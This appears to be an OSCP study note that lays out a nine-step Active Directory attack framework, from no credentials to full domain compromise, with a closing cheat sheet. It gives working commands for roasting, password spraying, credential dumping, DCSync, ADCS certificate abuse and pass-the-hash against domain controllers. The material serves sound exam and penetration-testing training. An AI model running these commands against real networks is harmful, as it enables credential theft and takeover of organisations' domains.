# 🧭 AD Attack Framework — The 9 Positions

> Anti-stuck framework for the OSCP AD set. "Stuck" almost always means you've lost track of **which position you're in** and what the legal moves are from it. Stop free-associating tools — identify your current position by **what access you hold right now**, then run only the moves that position allows. Each position has one job: reach the next position. This is the *positioning* layer on top of [[Active Directory]]'s linear chain.

Part of [[Active Directory]]. Related: [[AD Enumeration]] · [[Credential Attacks]] · [[BloodHound]] · [[AD Lateral Movement]] · [[AD ACL Abuse]] · [[DCSync & Domain Dominance]] · [[ADCS (Certipy)]] · [[Pivoting and Port Forwarding]]

---

## 🧠 HOW TO USE THIS

1. **Find your position** — what do you *actually* hold? (nothing / one cred / local admin somewhere / SYSTEM / an ACL edge / DCSync…).
2. **Run only that position's moves** — they're the complete legal move-set from there. If none land, you've under-enumerated the *previous* position, not hit a wall.
3. **Every position's exit is "I now hold more than I did"** — a new cred, a new host, a new right. If an hour passes with no position change, you're rabbit-holing → [[Stuck — What Now]].
4. **The AD set is one network.** A cred from Position 2 on host A is tried against *every* host at Position 1 again ([[Credential Reuse]]). Positions loop, they don't just advance.

> **Setup first (or Kerberos breaks):** DC in `/etc/hosts`, clock synced (`sudo ntpdate $DC`), domain FQDN known. See [[Active Directory]] setup.

---

## 📍 POSITION 0 — Outside, no credentials
**You hold:** network access only. **Job:** get *one* credential, hash, or roastable ticket.

- Confirm it's a DC: `88 + 389/636 + 445 + 53 + 135 + 3268`; `netexec smb $DC` → domain + hostname.
- 🟢 Build a userlist with **no creds**: `netexec smb $DC -u '' -p '' --rid-brute`, `kerbrute userenum -d $DOMAIN --dc $DC users.txt`, anonymous LDAP (`ldapsearch -x … namingContexts` → dump descriptions).
- 🟢 **AS-REP roast** the userlist (needs no creds) → crack → Position 1 ([[AS-REP Roasting]]).
- 🟢 Loot **non-AD services** on member hosts — web/SMB shares/FTP configs on the standalones often hand you the first domain cred ([[SMB]] · [[HTTP]]).
- 🟡 **ADCS ESC8 / coercion** — needs only network access + a web-enrollment CA ([[ADCS (Certipy)]]).
- 🟡 Spray *very* carefully (check lockout via `getdompwinfo`) with `username=username`, seasonal, or a leaked password.

**Exit:** one `user:pass`, NT hash, or `$krb5asrep$` you can crack → **Position 1**.

## 📍 POSITION 1 — One low-priv domain credential
**You hold:** a valid domain cred (plaintext or hash), admin nowhere yet. **Job:** find where it's powerful, or trade up.

- 🟢 **Authenticated enum, in full:** `netexec smb $DC -u $U -p $P --users --groups --shares --pass-pol`; `ldapdomaindump`; grep user `description`/`info` for passwords.
- 🟢 **BloodHound now:** `bloodhound-python -u $U -p $P -d $DOMAIN -dc dc01.$DOMAIN -c all -ns $DC` → **mark owned** → run *Shortest Path from Owned* ([[BloodHound]]).
- 🟢 **Kerberoast** (one cred is the only prerequisite) → crack service accounts ([[Kerberoasting]]).
- 🟢 **Spray the cred across every host**: `netexec smb <range> -u $U -p $P --continue-on-success` → look for `(Pwn3d!)` → **Position 2**.
- 🟡 Re-read shares/SYSVOL (GPP `cpassword` → `gpp-decrypt`), readable ACLs, group memberships.

**Exit:** `(Pwn3d!)` somewhere → P2 · a BloodHound edge → P5 · a cert/relay path → P6 · a cracked privileged cred → re-enter P1 richer.

## 📍 POSITION 2 — Local admin on a member host (`Pwn3d!`)
**You hold:** admin on at least one non-DC host. **Job:** convert admin into *new* credentials.

- 🟢 Shell as SYSTEM: `impacket-psexec`/`-wmiexec $DOMAIN/$U:$P@$IP` ([[AD Lateral Movement]]).
- 🟢 **Dump everything:** `netexec smb $IP -u $U -p $P --sam --lsa`; `impacket-secretsdump` → local hashes + **cached domain creds** + LSA secrets ([[Dumping Windows Hashes]]).
- 🟢 **LSASS** for cleartext/other users' hashes (`lsassy`, procdump+pypykatz).
- 🟡 Hunt **sessions**: who else is logged on here? (BloodHound `HasSession`) — their creds may be in memory.

**Exit:** new hash/cred → back to **Position 1** with it (reuse everywhere), or a privileged cred → P5/P7.

## 📍 POSITION 3 — Interactive user shell on a domain host
**You hold:** a shell (web/RCE/evil-winrm), user-level, not admin. **Job:** get SYSTEM here and/or harvest creds.

- 🟢 **`whoami /priv`** — `SeImpersonate` → PrintSpoofer/GodPotato → SYSTEM → **Position 4** ([[Token Privileges & Potato]]).
- 🟢 Local privesc sweep: winPEAS / PowerUp ([[Windows Privilege Escalation]]).
- 🟢 **Harvest creds on-host:** DPAPI, browsers, `cmdkey /list`, PS history, `web.config`/`unattend.xml`, credential vaults ([[Windows Stored Credentials]]).
- 🟡 Collect BloodHound from inside (SharpHound) if remote collection was thin; check cached Kerberos tickets (Rubeus/`klist`).

**Exit:** SYSTEM → P4 · a new domain cred → P1/P5.

## 📍 POSITION 4 — SYSTEM/admin on a non-DC host
**You hold:** full control of a member host. **Job:** extract a privileged domain principal or a route to the DC.

- 🟢 Dump SAM/LSA/LSASS + **machine account** hash; grab every cached domain cred ([[Dumping Windows Hashes]]).
- 🟢 **Token/session hijack:** impersonate a logged-on privileged user (incognito, Rubeus `triage`/`dump`).
- 🟢 **PtH the harvested hashes** across the range ([[Pass-the-Hash]]) — one of them is often admin elsewhere, maybe on the DC.
- 🟡 Pivot to internal-only subnets/hosts you couldn't see before ([[Pivoting and Port Forwarding]]); re-scan → new targets → re-enter P0/P1 on them.
- 🟡 Check the machine account for delegation / ADCS enrollment rights → P6.

**Exit:** a DA-equiv cred → P7 · an ACL edge → P5 · a cert/delegation primitive → P6 · new subnet → loop.

## 📍 POSITION 5 — An ACL edge (control over a principal)
**You hold:** BloodHound shows GenericAll / GenericWrite / WriteDACL / WriteOwner / ForceChangePassword / AddMember over a user, group, or computer. **Job:** abuse the exact edge and chain toward DA.

- 🟢 Match the edge to its abuse ([[AD ACL Abuse]]): `ForceChangePassword` → reset; `AddMember`/`GenericWrite`-on-group → add self; `GenericAll`-on-user → **targeted Kerberoast** (set SPN, roast, clear).
- 🟢 `WriteDACL`/`WriteOwner` → grant yourself **DCSync** (`impacket-dacledit -action write -rights DCSync …`) → **Position 7**.
- 🟡 `GenericAll`-on-computer → RBCD (advanced; prefer simpler edges under exam time).
- **Chain:** each abused edge is a new principal owned → mark it in BloodHound → re-run *Shortest Path to DA*.

**Exit:** DCSync right or DA group membership → P7 · a new cred → P1.

## 📍 POSITION 6 — A certificate / delegation / relay primitive
**You hold:** an ADCS ESC path, a delegation right, or a coercion+relay position. **Job:** impersonate a privileged principal (often `administrator` or `DC$`).

- 🟢 **ADCS:** `certipy find -vulnerable` → ESC1 (`req -upn administrator@$DOMAIN` → `auth -pfx` → NT hash + TGT) or ESC8 (relay a coerced DC → `DC$` cert) ([[ADCS (Certipy)]]). Add `-sid` on patched 2019+/2022 DCs.
- 🟡 **Delegation:** constrained/RBCD/unconstrained → S4U or capture a TGT (advanced; rarely the core OSCP path).
- 🟡 **Coercion → relay:** PetitPotam/printerbug/coercer → `ntlmrelayx`/`certipy relay`.

**Exit:** a privileged NT hash / TGT → **Position 7** (no cracking, no lockout).

## 📍 POSITION 7 — DCSync rights or Domain Admin
**You hold:** `GetChanges`+`GetChangesAll`, or membership in a DA-equivalent group. **Job:** own the DC and capture proof.

- 🟢 **DCSync:** `impacket-secretsdump $DOMAIN/$U:$P@$DC` (all hashes) or `-just-dc-user krbtgt` for the golden key ([[DCSync & Domain Dominance]]); `netexec smb $DC -u $U -p $P --ntds`.
- 🟢 **PtH the Administrator hash to the DC:** `impacket-psexec -hashes :<hash> Administrator@$DC` / `evil-winrm -i $DC -u Administrator -H <hash>` → SYSTEM on the DC → grab `proof.txt` + screenshot.

**Exit:** DC owned, krbtgt + every NTDS hash in hand → **Position 8**.

## 📍 POSITION 8 — Domain owned: sweep & proof
**You hold:** the domain. **Job:** make sure *every* host's proof is captured and nothing was missed.

- 🟢 **Reuse every recovered hash** across the whole range — the AD set is one network; the last standalone often falls to a domain hash ([[Credential Reuse]]).
- 🟢 **Golden Ticket** (krbtgt hash + domain SID) for guaranteed access to any host, any user ([[DCSync & Domain Dominance]]).
- 🟢 Confirm `local.txt`/`proof.txt` captured **and submitted** for every owned host, each screenshot showing the target IP + `whoami` ([[Exam Workflow]]).
- 🟡 Track every change for cleanup / the report ([[Post-Engagement Cleanup]]).

**Exit:** all hosts owned, all proofs submitted. Done.

---

## 🧭 STUCK → FIND YOUR POSITION (router)
| What you hold right now | You're at | Do this |
|---|---|---|
| Nothing but network access | P0 | unauth userlist + AS-REP + loot member services |
| One domain cred, admin nowhere | P1 | authed enum + BloodHound + Kerberoast + **spray everywhere** |
| A cred that's `(Pwn3d!)` somewhere | P2 | psexec → SYSTEM → secretsdump → new creds |
| A user shell, not admin | P3 | `whoami /priv` (potato) + winPEAS + harvest creds |
| SYSTEM on a member host | P4 | dump cached creds + tokens → PtH range → pivot |
| A BloodHound edge | P5 | abuse the exact edge → chain → DCSync |
| An ESC/relay/delegation primitive | P6 | certipy/relay → privileged hash/TGT |
| DCSync / DA | P7 | secretsdump → PtH the DC → proof |
| The domain | P8 | reuse hashes range-wide + confirm all proofs |

## 🔁 POSITION TRANSITIONS (it's a graph, not a ladder)
```
P0 ──cred──▶ P1 ──Pwn3d!──▶ P2 ──new cred──▶ P1 (richer)
 │            │  ├─shell────▶ P3 ──SYSTEM──▶ P4 ──cred/PtH──▶ P1/P7
 │            │  ├─edge─────▶ P5 ──DCSync right──▶ P7
 │            │  └─cert/relay▶ P6 ──priv hash/TGT─▶ P7
 └─AS-REP/ADCS────────────────────────────────────▶ P1/P6
                                   P7 ──own DC──▶ P8 (sweep + proof)
```
Most "stuck" moments are **P1 under-enumerated** (didn't Kerberoast, didn't BloodHound-from-owned, didn't spray every host) or **P4 not looted** (didn't pull cached creds/tokens before moving on).

## ⚠️ COMMON MISTAKES (per position)
- **P0:** forgetting AS-REP roast needs *no* creds; not looting the standalone boxes for the first domain cred.
- **P1:** not marking owned in BloodHound; spraying before `getdompwinfo`; not re-spraying a new cred across *all* hosts.
- **P2/P4:** taking the shell and leaving without `secretsdump`/LSASS/token harvest.
- **P5:** hunting a fancy edge when a simpler one reaches DA faster; breaking a monitored account instead of add-to-group/roast.
- **P7:** cracking the Administrator hash instead of **passing** it.
- **All:** treating the three AD hosts as separate boxes instead of one network.

## 🛑 STOP CONDITION
You are never "done" with the AD set until **every** host has a submitted proof. If you can't change position for ~20–30 min, you're in the wrong position or under-enumerated the previous one — drop back one position, re-enumerate it fully, and reuse every credential you hold across every host before concluding you're blocked ([[Stuck — What Now]]).

## 📇 CHEAT SHEET (one move per position)
```bash
# P0  userlist + AS-REP (no creds)
netexec smb $DC -u '' -p '' --rid-brute ; impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat
```
```bash
# P1  authed enum + roast + spray
bloodhound-python -u $U -p $P -d $DOMAIN -dc dc01.$DOMAIN -c all -ns $DC ; impacket-GetUserSPNs $DOMAIN/$U:$P -dc-ip $DC -request ; netexec smb <range> -u $U -p $P --continue-on-success
```
```bash
# P2/P4  admin host -> new creds
impacket-secretsdump $DOMAIN/$U:$P@$IP        # + netexec --sam --lsa ; lsassy
```
```bash
# P3  user shell -> SYSTEM / creds
whoami /priv    # SeImpersonate -> PrintSpoofer/GodPotato ; winPEAS ; cmdkey /list
```
```bash
# P5  ACL edge -> DCSync right
impacket-dacledit -action write -rights DCSync -principal $U -target-dn "DC=corp,DC=local" "$DOMAIN"/"$U":"$P"
```
```bash
# P6  ADCS -> priv hash
certipy find -u $U@$DOMAIN -p $P -dc-ip $DC -vulnerable ; certipy req -u $U@$DOMAIN -p $P -ca CA -template VULN -upn administrator@$DOMAIN ; certipy auth -pfx administrator.pfx -dc-ip $DC
```
```bash
# P7  DCSync -> own DC
impacket-secretsdump $DOMAIN/$U:$P@$DC ; impacket-psexec -hashes :<admin-hash> Administrator@$DC
```
**Rule:** identify the position → run its moves → the moment you hold something new, re-enter P1 and reuse it everywhere.
